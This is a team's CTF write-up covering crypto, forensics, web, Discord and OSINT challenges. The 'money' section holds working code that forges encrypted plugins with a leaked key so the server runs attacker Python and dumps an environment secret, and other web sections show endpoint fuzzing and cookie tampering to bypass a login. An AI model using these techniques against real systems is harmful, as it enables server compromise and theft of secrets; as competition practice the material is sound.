# $ P3sk0b@r - Patrick, Vlad, Andrei
- 5th place

## Writeups

### Crypto

- Repeated RSA

- [SSS](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#SSS)

- Neverending Randomness

- XORBITANT

- Baby_crib

### Forensics

- [Unknown-traffic1](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#unknown-traffic1)

- Unknown-traffic2

- [Hidden in the cartridge](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#hidden_in_the_cartridge)

- [Baofeng](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#baofeng)

- [3_rd child](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#3rd_child)

- Anticheat

### Reverse engineering

- Pythonese

- Ironveil

### Misc

- octojail

- [onions1](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#onions1)

- [onions2](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#onions2)

- [disco_dance](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#disco_dance)

- [disco_rave](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#disco_rave)

- [discord](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#discord)

- [Escaping-Barcelona](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#escaping-barcelona)

### web

- [money](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#money)

- [dot-private-key](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#dot-private-key)

- [random-gallery](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#random-gallery)

- theme-generator

### Pwn

- Sigdance

- Baby-BOF

- Fini

- Minecrafty

### Osint

- Holiday Trip

- Prison

- [Ancient_house](https://github.com/vladirocox/ctf-ac.upt.ro/blob/main/README.MD#ancient_house)

## --------------------------------------------------

### money

- The landing page was all neon and the big “Insert Coin” box. Two widgets were already there (Sales Chart, Flag), and a locked Store teased me.

- I pulled the source. In server.py I saw uploads had to be .plugin files. The server takes the first 16 bytes as IV, decrypts the rest with AES‑CBC using a hard-coded key, treats the plaintext as a ZIP, extracts it, and (the fun part) executes init.py. That shaped the plan: make a tiny plugin to unlock the Store; if the Store’s flag plugin doesn’t reveal the flag, use my own init.py to grab it from the environment.

- First move: create a minimal plugin. I wrote a small builder that zips index.html + icon + plugin_manifest.json and encrypts it into coin.plugin.

```
--- build_coin_plugin.py ---
import os, json, zipfile
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from secrets import token_bytes

KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"  # from server.py

os.makedirs("myplugin", exist_ok=True)
open("myplugin/index.html","w").write("<h1>hello vc</h1>")
open("myplugin/icon.png","wb").write(
    b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00"
    b"\x90wS\xde\x00\x00\x00\nIDATx\x9cc``\x00\x00\x00\x02\x00\x01\xe2!\xbc3\x00\x00\x00\x00IEND\xaeB`\x82"
)
json.dump({"name":"Coin","version":"1.0","author":"me","icon":"icon.png"},
          open("myplugin/plugin_manifest.json","w"))

with zipfile.ZipFile("plugin.zip","w",zipfile.ZIP_DEFLATED) as z:
    for n in ["index.html","icon.png","plugin_manifest.json"]:
        z.write(f"myplugin/{n}", arcname=n)

iv = token_bytes(16)
data = open("plugin.zip","rb").read()
ct = AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(data,16))
open("coin.plugin","wb").write(iv+ct)
print("coin.plugin ready")
```

- I uploaded coin.plugin via Insert Coin. Third widget appeared, Store unlocked. Nice.

- I grabbed the official flag.plugin and tried the lazy route: decrypt it locally. Here’s the quick decryptor I used.

```
--- decrypt_flag.py ---
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import zipfile

KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"

blob = open("flag.plugin","rb").read()
iv, ct = blob[:16], blob[16:]
pt = unpad(AES.new(KEY, AES.MODE_CBC, iv).decrypt(ct), 16)
open("flag.zip","wb").write(pt)
with zipfile.ZipFile("flag.zip") as z:
    z.extractall("flag_plugin")
print("unzipped to flag_plugin/")
```

- That was a dead end. The extracted plugin had an init.py that reads the flag from the server’s environment (os.getenv("FLAG")). Locally, there’s no flag to find.

- So I pivoted: if their init.py runs on upload, mine can run too. I made a second plugin that writes the env flag to a file the app serves from the widget folder.

```
--- build_steal_plugin.py ---
import os, json, zipfile
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from secrets import token_bytes

KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"

os.makedirs("steal", exist_ok=True)
open("steal/index.html","w").write("<h1>hi</h1>")
open("steal/init.py","w").write(
    "import os, pathlib\n"
    "p = pathlib.Path(__file__).resolve().parent\n"
    "(p/'pwnd.txt').write_text(os.getenv('FLAG','no flag found'))\n"
)
open("steal/icon.png","wb").write(
    b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00"
    b"\x90wS\xde\x00\x00\x00\nIDATx\x9cc``\x00\x00\x00\x02\x00\x01\xe2!\xbc3\x00\x00\x00\x00IEND\xaeB`\x82"
)
json.dump({"name":"Coin","version":"1.0","author":"me","icon":"icon.png"},
          open("steal/plugin_manifest.json","w"))

with zipfile.ZipFile("plugin.zip","w",zipfile.ZIP_DEFLATED) as z:
    for n in ["index.html","init.py","icon.png","plugin_manifest.json"]:
        z.write(f"steal/{n}", arcname=n)

iv = token_bytes(16)
data = open("plugin.zip","rb").read()
ct = AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(data,16))
open("steal.plugin","wb").write(iv+ct)
print("steal.plugin ready")
```

- I uploaded steal.plugin. The widget card popped up with a /widget/<uid> URL. Appending /pwnd.txt gave me exactly what I wanted:

- /widget/uid/pwnd.txt

- CTF{9fb64c8a4d81f9d0e1f4108467bee58db112d0d1457fa3716cc6a46231803686}

### unknown_traffic1

- I opened the PCAP in Wireshark. Full of HTTP. What I did see: a huge number of ICMP echo requests (pings). That felt suspicious, so I clicked a few. The payloads weren’t the boring zeroes you normally see; they looked like neat little ASCII chunks. base64… maybe?

- I tried Follow → ICMP Stream hoping it would magically show a message. Nope—just tiny fragments. I also poked Export Objects out of habit. Nothing.

- Alright, command line time. I reached for tshark to pull the payloads out in order.

```
tshark -r unknown-traffic1.pcap -Y "icmp.type==8 && data.data"   -T fields -e icmp.seq -e data.data | sort -n -k1,1 | awk '{print $2}' | tr -d '
' | xxd -r -p | base64 -d; echo
```

- ctf{72c8c1090e0bba717671f79de6e941a281e2f51da29865722f98c9fa3b7160e5}

### sss

- Three long hex strings: P1, P2, P3.

- I tossed the shares into Python. First try crashed—one of the strings had an odd number of hex characters (classic paste gremlin). I just padded a trailing 0 when the length was odd and moved on. Then I pulled out the x (2nd byte) and the “body” (the rest), and combined the three bodies with XOR. That gave me a 256-byte blob called SSS_secret.bin.

```
Python used:
P1 = "8010ba0d6e...f79bd12"
P2 = "80264e325a...149a95a"
P3 = "8036f43f34...e44142b"

def fix(h):  # pad if odd count of hex nibbles
    return h if len(h) % 2 == 0 else h + "0"

def parse(h):
    b = bytes.fromhex(fix(h))
    assert b[0] == 0x80
    return b[1], b[2:]  # x, y-bytes

x1,y1 = parse(P1)
x2,y2 = parse(P2)
x3,y3 = parse(P3)

secret = bytes(a ^ b ^ c for a,b,c in zip(y1,y2,y3))
open("SSS_secret.bin","wb").write(secret)
```

Poking the blob
Time for quick reconnaissance:

- quick ID
file SSS_secret.bin

- peek as hex
xxd -g 1 -l 256 SSS_secret.bin | sed -n '1,32p'

- search for ASCII flag
strings -a SSS_secret.bin | grep -iE 'ctf\{|flag\{'

- search for UTF-16LE flag
strings -el SSS_secret.bin | grep -iE 'ctf\{|flag\{'

Nothing obvious. The hex dump had lots of zeros and pairs like 03 90, 06 50, 03 30—looked like each char might be split across two bytes (nibbles). I also tried a quick “reverse 16-bit” scan just in case:
```
python3 - << 'PY'
import struct,re
b=open("SSS_secret.bin","rb").read()
w=list(struct.unpack("<{}H".format(len(b)//2), b))
rb=struct.pack("<{}H".format(len(w)), *w[::-1])
for s in (b.decode("utf-16le","ignore"),
          rb.decode("utf-16le","ignore"),
          b.decode("latin1","ignore")):
    m=re.search(r'(ctf|flag)\{[^}]+\}', s, re.I)
    if m: print(m.group(0))
PY
```
- Still nothing obvious. I printed a base64 for a different angle—it looked like structured data near the end:
```
python3 - << 'PY'
import base64
print(base64.b64encode(open("SSS_secret.bin","rb").read()).decode())
PY
```
- Those byte pairs really felt like nibbles. I split the blob into even/odd bytes, combined the low nibble of the even byte with the high nibble of the odd byte to rebuild characters, then reversed the result. That popped the flag instantly.

- Python used:
```
b = open("SSS_secret.bin","rb").read()
even, odd = b[::2], b[1::2]

# high nibble from even's low 4 bits, low nibble from odd's high 4 bits
ascii_bytes = bytes(((e & 0x0F) << 4) | (o >> 4) for e,o in zip(even, odd))

# the text is reversed
s = ascii_bytes[::-1].decode('ascii', 'ignore')

import re
print(re.search(r'(?:ctf|flag)\{[^}]+\}', s).group(0))
```

- ctf{d6b72529c6177d8f648ae85f624a24d6f1edce5ca29bd7cc0b888e117a123892}

### dot-private-key

- I opened DevTools → Network → I pasted a fake key and hit Check: POST /key with my secret in the payload.

```
HOST=http://ctf.ac.upt.ro:9198
curl -i "$HOST/key"   -H 'Content-Type: application/json'   --data '{"key":"sk_live_TESTC","type":"api"}'
```
- At first I used "type":"API Key" and the server scolded me with Invalid type field. Lowercasing to "api" fixed it. Small stumble, quick fix.

My next instinct was to go flag-hunting the lazy way:

```
curl -i $HOST/flag
curl -i $HOST/flag.txt
curl -i $HOST/robots.txt
```

- All 404s.

- I grabbed the page and assets:

```
curl -s $HOST -o index.html
grep -Eo '(src|href)="[^"]+"' index.html | sed 's/.*="//;s/"$//' | sort -u
# script.js, styles.css

curl -s $HOST/script.js -o script.js
grep -nE 'fetch\(|/key|/lastUpdate' script.js
```

- The JS was tiny—POST /key and a GET /lastUpdate. That felt like a side door had to exist. Instead of unleashing a giant wordlist, I tried a surgical one:

```
cat > endpoints.txt <<'EOF'
dump
export
export.csv
keys
logs
db.json
EOF
```

```
ffuf -w endpoints.txt -u $HOST/FUZZ -mc 200,204,301,302,307,308,401,403
# /dump → 200
```

- That was the moment. I pulled it:

```
curl -s $HOST/dump -o dump.json
```

The file was leaked:

```
grep -Eio 'ctf\{[^}]+\}' dump.json
# ctf{284dc217ce36b9133c561207af3dbf6b8656323d6375f3f5c8c955be0a2aab66}
```

### baofeng

- The file Call.mp3 is available for download.
- It is a radio transmission recording.
- It lacks quality and clarity so I have applied some AI Clarity filter.
- Listening to the audio, I hear CQ CQ CQ this is yankee oscar two tango sierra sierra calling from kilo november 15 kilo sierra. 
- This is the radio alphabet, so, it says YO2TSS, calling from KS15KS
- Searching the location, I see the answer Hunedoara. 
- ctf{YO2TSS_Hunedoara}
    <img width="1920" height="1080" alt="Screenshot_17-Sep_17-59-11_13453" src="https://cdn.discordapp.com/attachments/1416169229652328599/1418207157215559780/IMG_8984.png?ex=68cd47d7&is=68cbf657&hm=e7ad98fcd5c02c3a9a2330cd1d7e5a52f096c55df9c415e9e91fe5200fe83af7&">
### hidden_in_the_cartridge
- This challange was pretty easy. I started by running strings on the .nes file and exported it to a txt file.
```
strings space_invaders.nes >> txt.txt
```
- I instantly thought the long lines of text had to do something with the flag.
- Copy pasted everything in cyberchef and decoded it from hex.
- ctf{9f1b438164dbc8a6249ba5c66fc0d6195b5388beed890680bf616021f2582248}
<img width="1920" height="1080" alt="Screenshot_17-Sep_17-59-11_13453" src="https://github.com/user-attachments/assets/7d0d5067-a257-4d47-8613-878e59aea801" />

### onions2
- At first, it may seem like it's just a picture, but in reality, it hides an onion link.
- That's what I discovered when i ran zsteg.
- t465kjcwuqbpabjeh3za73zkxxlzymattskj2gj3ftkvmm5unnyqrvyd.onion
- Opening the link, I immediately recognise the saying from overclock's bio:)))
- Everything seemed fine, nothing out of the ordinary on the ui, so I opened the source code, which looked relatively fine, the single outlier being the font which was suspicious.
- I downloaded it and ran strings on it.
- Nothing caught my eye, except the reaaallyyyy long final line, which I entered onto cyberchef.
- After several times of using Magic, decrypting from base64, then from hex, from morse code and finally from binary, I see a google maps link.
<img width="1920" height="1080" alt="Screenshot_17-Sep_16-43-29_15717" src="https://github.com/user-attachments/assets/39a0ece4-4714-4348-85c7-f623cf948c0a" />
- Opening it, I look at the picture closely. I see something special.
- Looking at the whole image gallery, I finally discover a QR code.
<img width="1920" height="1080" alt="Screenshot_17-Sep_17-18-48_4287" src="https://github.com/user-attachments/assets/ed155ca9-d0a8-465d-84f1-e310fbea3e34" />
- Scanning it reveales the flag.
- ctf{199a4b2aee1bcab9e885624331f9bd5808a2167c49daa343ca81c44a03d7f4ef}

### random-gallery
- Seeing the login page, I instantly tried some random logins, like admin admin.
- No succes, so I tried an SQL injection, still nothing.
- Checked the Cookie-Editor extension and saw a sessioj and logged_in cookie.
- Changed the logged_in cookie from false to true, and tried my luck navigating to "/gallery".
- Navigated to city>haunts>me and saw a qr code which scanned, gave a pastebin link, linking to the flag.
- https://pastebin.com/9HibccWH > ctf{1cd4daf060aee882653595cca4e719d48a3080cd1b76055812145da8a10b47e1}
<img width="1147" height="1147" alt="not-a-flag" src="https://github.com/user-attachments/assets/a3c0b7b0-42b4-49a0-88c3-f2c860ddbbf3" />

### Discord
- The flag_channel does not actually contain the flag. Analyzing the food recipes will just make you hungry.
- Opening the sticker panel, we are instantly greeted with the CTF@AC Logo, with the qr code visually hidden.
- ![Screenshot_1](https://github.com/user-attachments/assets/611465e0-dc52-44f8-9c13-3046e49a0a8b)
- Vencord (custom discord client) let me instantly get the bigger picture, which I put a grayscale filter over, so that the picture would scan easier.
- ![image](https://github.com/user-attachments/assets/d9f603ef-9f99-4c1d-bda4-697063bf4c27)
- The link redirects you to example.com, but, inside the link, there is a hidden parameter stating the flag.
- ![IMG_8939](https://github.com/user-attachments/assets/a2157a72-41c0-4c3f-991e-0a1ce4893b47)
- ctf{7B9096dbeab272bd4d02ea9a5e0f66568ab274b2096f8be3933a48131f8e4db907}

### disco_dance
- The discord series was my favourite type of challanges.
- They were so well thought and engineered, and actually made me smile.
- Regarding disco_dance, the server sends an encrypted text, which can only be decoded using the contents of the last 5 messages in the "spam" channel.
- ChatGPT and I kinda underengineered it, as the script lacks the ability to automatically fetch the contents using the discord api. 
- This would have helped me get a first blood for the next challange easily.
- Thankfully, my coleague, which I thank a lot, filled the chat with "a" s, which made it impressively easy for me and the script to decode the flag.
- CTF{f55ba4939edd5611a7ab797529b51dae47989b3c5a99f2ffc82e4b2c74d03e56}
- Here is the script I used:

```
#!/usr/bin/env python3
"""
Conectează-te la host:port, citește JSON-ul returnat (o linie) cu cheia 'encrypted',
construiește seed = "a" repetat de 5 ori, derivează SHA256(seed) -> AES key,
decodează base64(iv + ciphertext) și decriptează AES-CBC + PKCS7 unpad -> afișează flag.
"""

import sys
import socket
import json
import base64
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import unpad

def derive_key_from_seed(seed: bytes) -> bytes:
    h = SHA256.new()
    h.update(seed)
    return h.digest()

def decrypt_blob_b64(encrypted_b64: str, seed_bytes: bytes) -> bytes:
    raw = base64.b64decode(encrypted_b64)
    if len(raw) < 16:
        raise ValueError("Blob prea scurt (nu exista IV + ciphertext).")
    iv = raw[:16]
    ct = raw[16:]
    key = derive_key_from_seed(seed_bytes)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt_padded = cipher.decrypt(ct)
    try:
        pt = unpad(pt_padded, AES.block_size)
    except ValueError as e:
        raise ValueError("Eroare la unpad (cheie/seed greșit sau ciphertext corupt).") from e
    return pt

def recv_line(sock: socket.socket, timeout: float = 5.0) -> str:
    sock.settimeout(timeout)
    buf = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
        if b"\n" in buf:
            break
    return buf.decode(errors="replace").strip()

def main():
    if len(sys.argv) < 2:
        print("Usage: python disco_dance.py <HOST> [PORT]")
        sys.exit(2)
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 5000

    # seed = concatenarea celor 5 mesaje "a"
    seed_string = "a" * 5  # "aaaaa"
    seed_bytes = seed_string.encode("utf-8")

    try:
        with socket.create_connection((host, port), timeout=8) as s:
            # primim o linie (JSON) de la server
            data_line = recv_line(s, timeout=6.0)
    except Exception as e:
        print(f"Conexiune esuata: {e}")
        sys.exit(1)

    if not data_line:
        print("Nu am primit niciun raspuns de la server.")
        sys.exit(1)

    # încercăm să parsăm JSON; server trimite string reprezentare dict ('{'encrypted': '...'}')
    encrypted_b64 = None
    try:
        parsed = json.loads(data_line)
        if isinstance(parsed, dict) and "encrypted" in parsed:
            encrypted_b64 = parsed["encrypted"]
    except Exception:
        alt = data_line.strip()
        try:
            alt_json = alt.replace("'", '"')
            parsed = json.loads(alt_json)
            if isinstance(parsed, dict) and "encrypted" in parsed:
                encrypted_b64 = parsed["encrypted"]
        except Exception:
            try:
                if "encrypted" in data_line:
                    idx = data_line.find("encrypted")
                    sub = data_line[idx:]
                    for q in ("'", '"'):
                        p1 = sub.find(q)
                        if p1 != -1:
                            p2 = sub.find(q, p1+1)
                            if p2 != -1:
                                encrypted_b64 = sub[p1+1:p2]
                                break
            except Exception:
                encrypted_b64 = None

    if not encrypted_b64:
        print("Nu am reușit să extrag câmpul 'encrypted' din răspunsul serverului.")
        print("Răspuns brut primit:")
        print(data_line)
        sys.exit(1)

    print("Encrypted (base64):", encrypted_b64)
    print("Folosesc seed (5x 'a'):", repr(seed_string))

    try:
        plaintext = decrypt_blob_b64(encrypted_b64, seed_bytes)
    except Exception as e:
        print("Eroare la decriptare:", e)
        sys.exit(1)

    print("\n== Decrypted plaintext (bytes) ==")
    print(plaintext)
    print("\n== Decrypted plaintext (utf-8 if decodable) ==")
    try:
        print(plaintext.decode("utf-8"))
    except Exception:
        print("<cannot decode as utf-8>")

if __name__ == "__main__":
    main()
```

### disco_rave
- Another congrats to the organisers and challange writers, as this one was my favourite.
- It took me a while to find the bug in my code, which caused error 401 Unauthorized when trying to fetch data using the discord api.
- The challange works relatively the same. This time, it fetches the last messages ("content" and "timestamp") from the both spam channels. 
- This time, using an automatically message fetcher was necessary, as the whole chat was going crazy, and getting the exact timestamp manually would take too long. Even longer than actually making an automatic message fetcher.
- Long story short, using a similar script, this time automatically fetching every piece of information needed, I instantly got the flag.
- CTF{a83a34f8791905a4edd6e03beefeddc1c7eeeeeacf9d96af6d1e3c34494df4cc}
```
#!/usr/bin/env python3

import os
import sys
import json
import argparse
import time
import base64
import socket
import requests
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Channels (în aceeași ordine ca serverul)
CHANNELS = [
    "1416908413375479891",
    "1417154025371209852",
]

DISCORD_API_BASE = "https://discord.com/api/v10"

def fetch_messages_channel(token: str, channel_id: str, limit: int = 10, retry: int = 3, backoff: float = 1.0):
    """
    Returnează lista de mesaje (JSON list) pentru channel_id în ordinea returnată de API (newest->oldest).
    """
    url = f"{DISCORD_API_BASE}/channels/{channel_id}/messages"
    headers = {"Authorization": f"{token}"}
    params = {"limit": limit}
    for attempt in range(1, retry + 1):
        try:
            r = requests.get(url, headers=headers, params=params, timeout=10)
            r.raise_for_status()
            data = r.json()
            if not isinstance(data, list):
                raise RuntimeError("Unexpected response shape: not a list")
            return data
        except requests.HTTPError as e:
            status = getattr(e.response, "status_code", None)
            if status == 429:
                try:
                    j = e.response.json()
                    wait = j.get("retry_after", backoff)
                    # retry_after might be seconds (float)
                except Exception:
                    wait = backoff
                time.sleep(wait if isinstance(wait, (int, float)) else backoff)
                continue
            # for 401/403 -> stop and raise
            raise
        except Exception as e:
            if attempt < retry:
                time.sleep(backoff * attempt)
                continue
            raise

def build_seed_from_channels(token: str, channels, limit: int = 10):
    """
    Construiește seed-ul EXACT ca serverul: pentru fiecare canal (în lista channels),
    ia mesajele returnate de API (în ordinea API), pentru fiecare msg concatenează content + timestamp,
    apoi concatenează toate acestea (mai întâi toate din channel1, apoi channel2).
    Returnează seed în bytes (utf-8).
    """
    parts = []
    for ch in channels:
        msgs = fetch_messages_channel(token, ch, limit=limit)
        # păstrăm ordinea exactă a listei returnate de API
        for m in msgs:
            content = m.get("content", "") or ""
            timestamp = m.get("timestamp", "") or ""
            parts.append(f"{content}{timestamp}")
    concatenated = "".join(parts)
    return concatenated.encode("utf-8"), parts  # returnăm și lista pentru debugging

def derive_key_from_seed(seed_bytes: bytes):
    h = SHA256.new()
    h.update(seed_bytes)
    return h.digest()

def decrypt_blob_b64(encrypted_b64: str, seed_bytes: bytes):
    raw = base64.b64decode(encrypted_b64)
    if len(raw) < 16:
        raise ValueError("Encrypted blob prea scurt (IV + ciphertext lipsește).")
    iv = raw[:16]
    ct = raw[16:]
    key = derive_key_from_seed(seed_bytes)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt_padded = cipher.decrypt(ct)
    pt = unpad(pt_padded, AES.block_size)
    return pt

def recv_line(sock: socket.socket, timeout: float = 6.0) -> str:
    sock.settimeout(timeout)
    buf = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
        if b"\n" in buf:
            break
    return buf.decode(errors="replace").strip()

def extract_encrypted(line: str):
    # încearcă JSON -> string cu apostroafe -> parsing rudimentar
    try:
        j = json.loads(line)
        if isinstance(j, dict) and "encrypted" in j:
            return j["encrypted"]
    except Exception:
        pass
    try:
        j = json.loads(line.replace("'", '"'))
        if isinstance(j, dict) and "encrypted" in j:
            return j["encrypted"]
    except Exception:
        pass
    if "encrypted" in line:
        sub = line[line.find("encrypted"):]
        for q in ('"', "'"):
            a = sub.find(q)
            if a != -1:
                b = sub.find(q, a+1)
                if b != -1:
                    return sub[a+1:b]
    return None

def main():
    parser = argparse.ArgumentParser(description="Fetch messages from Discord (bot token), build seed and decrypt CTF service output.")
    parser.add_argument("host", help="CTF host/IP")
    parser.add_argument("port", nargs="?", type=int, default=5000, help="CTF port (default 5000)")
    parser.add_argument("--token", help="Bot token (optional). Better set DISCORD_BOT_TOKEN env var).")
    parser.add_argument("--limit", type=int, default=10, help="How many messages to fetch per channel (default 10)")
    parser.add_argument("--show-seed", action="store_true", help="Print seed (for local debug only!). Do NOT share seed.")
    args = parser.parse_args()

    token = args.token or os.getenv("DISCORD_BOT_TOKEN")
    if not token:
        print("ERROR: furnizează token bot (env DISCORD_BOT_TOKEN sau --token).")
        sys.exit(1)

    try:
        seed_bytes, parts = build_seed_from_channels(token, CHANNELS, limit=args.limit)
    except Exception as e:
        print("[!] Eroare la fetch mesaje de pe Discord:", e)
        sys.exit(1)

    print(f"[*] Seed construit ({len(seed_bytes)} bytes).")
    if args.show_seed:
        # Atenție: nu publica seedul! Folosește doar local pentru debugging.
        print("DEBUG seed repr (don't share):")
        try:
            print(repr(seed_bytes.decode("utf-8", errors="replace")))
        except Exception:
            print(repr(seed_bytes))

    # Optionally print each part for debugging
    # for i, p in enumerate(parts):
    #     print(f"[{i}] repr: {repr(p)}")

    # Connect to CTF host
    try:
        with socket.create_connection((args.host, args.port), timeout=8) as s:
            line = recv_line(s, timeout=6.0)
    except Exception as e:
        print("[!] Nu am putut conecta la CTF server:", e)
        sys.exit(1)

    if not line:
        print("[!] Nu am primit răspuns de la server.")
        sys.exit(1)

    encrypted_b64 = extract_encrypted(line)
    if not encrypted_b64:
        print("[!] Nu am putut extrage 'encrypted' din:", line)
        sys.exit(1)

    print("[*] Am primit encrypted (base64). Decriptez...")
    try:
        plaintext = decrypt_blob_b64(encrypted_b64, seed_bytes)
    except Exception as e:
        print("[!] Eroare la decriptare:", e)
        print("    Verifică:")
        print("    - bot-ul are permisiunile View Channels + Read Message History")
        print("    - mesajele returnate conțin exact timestamp-urile așa cum le folosește serverul")
        sys.exit(1)

    print("\n== Decrypted (bytes) ==")
    print(plaintext)
    print("\n== Decrypted (utf-8 if possible) ==")
    try:
        print(plaintext.decode("utf-8"))
    except Exception:
        print("<not valid utf-8>")

if __name__ == "__main__":
    main()

```

### ancient_house
- This challange may seem difficult at first sight, but it actually uncovers a simple solve.
- Downloading the picture given and asking chatgpt to repair it according to the text, we get a clean picture, which google lens instantly recognises and gives us the flag at first sight.
- ![image](https://github.com/user-attachments/assets/27e95e63-0610-4656-81b5-7f120ea5bf2b)
- ![image](https://github.com/user-attachments/assets/65a13869-f053-4e2c-a812-06afa1c10fc1)

- CTF{Dumbrava}

### 3rd_child
- By playing the audio file, I instantly recognise the familiar song name, but also an audio pattern which surely states CTF.
- The rest of the flag/ sha256, is being overlapped by the song.
- Using audacity, I could see 3 tracks. I enabled the "show spectogram" option, and finally, the last track displayed the flag.
- ![image (1)](https://github.com/user-attachments/assets/1fb861b0-f110-4463-a7c7-a6ee597071ec)

### onions1
- The easiest challange. Easier than "feedback".
- The long "hashy" link and the ".onion" extension made me open tor browser in a split second.
- Opening the website, the flag was shown.
- ![image](https://github.com/user-attachments/assets/c397a16b-4335-4cbd-b020-145b4bf73ef8)
- ctf{fc5b4974d9c262a40810686f06dc5525b046a810ad3f8cd20d62f4d2f6379dbd}

### Escaping-Barcelona
- My qwant and google search queries were really bad, not finding any posibile solution to this challange.
- Grok, though, was ready to help me.
- Using a new library, that I have never heard of, the distance was easily calculated.
- ctf{361.287 M km}
```
from astropy.utils.iers import conf
conf.auto_max_age = None
import astropy.units as u
from astropy.time import Time
from astropy.coordinates import get_body_barycentric, EarthLocation
t = Time('2025-11-07T16:00:00')
location = EarthLocation(lat=41.3851*u.deg, lon=2.1734*u.deg, height=0*u.m)
observer_gcrs = location.get_gcrs(t)
earth_bary = get_body_barycentric('earth', t)
observer_bary = earth_bary + observer_gcrs.cartesian
mars_bary = get_body_barycentric('mars', t)
delta = mars_bary - observer_bary
distance = delta.norm()
dist_km = distance.to(u.km).value
dist_mkm = dist_km / 1e6
print(f"ctf{{{dist_mkm:.3f} M km}}")
```
